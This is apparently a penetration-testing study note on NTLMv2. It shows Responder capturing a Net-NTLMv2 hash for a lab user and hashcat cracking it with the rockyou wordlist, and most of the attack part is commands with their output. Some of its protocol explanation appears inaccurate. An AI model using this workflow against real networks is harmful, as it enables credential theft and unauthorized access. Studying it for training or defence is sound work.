# NTLMv2

New Technology Network Manager v2 is, you guessed it, the updated (and more widely used) version of NTLM. It is stored as **HMAC-MD5** hash in SAM.

NTLMv2's challenge is a timestamp rather than a randomly generated number (NTLM), the timestamp is hashed with the users password and is sent as the response.



## Responder

The responder tool includes a built-in SMB server that handles the authentication process for us and prints all captured Net-NTLMv2 hashes.

{% embed url="https://www.kali.org/tools/responder/" %}

### Start Responder

```
kali@kali:~$ sudo responder -I tap0 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
...
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
...
[+] Listening for events... 
```



### Capturing NTLMv2 Hash

```
...
[+] Listening for events... 
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:
010100000000000000B050CD1777D801B7585DF5719A
CFBA0000000002000800360057004D00520001001E00570049004E002D00340
044004E004800550058004300340054004900430004003400570049004E002D
00340044004E00480055005800430034005400490043002E00360057004D005
2002E004C004F00430041004C0003001400360057004D0052002E004C004F00
430041004C0005001400360057004D0052002E004C004F00430041004C00070
0080000B050CD1777D801060004000200000008003000300000000000000...
```



### Cracking with Hashcat

We'll save the output of reponder and use Hashcat with our wordlist to crack the NTLMv2 hash.

```
kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting
...

PAUL::FILES01:1f9d4c51f6e...00000000000000:123Password123
...
```
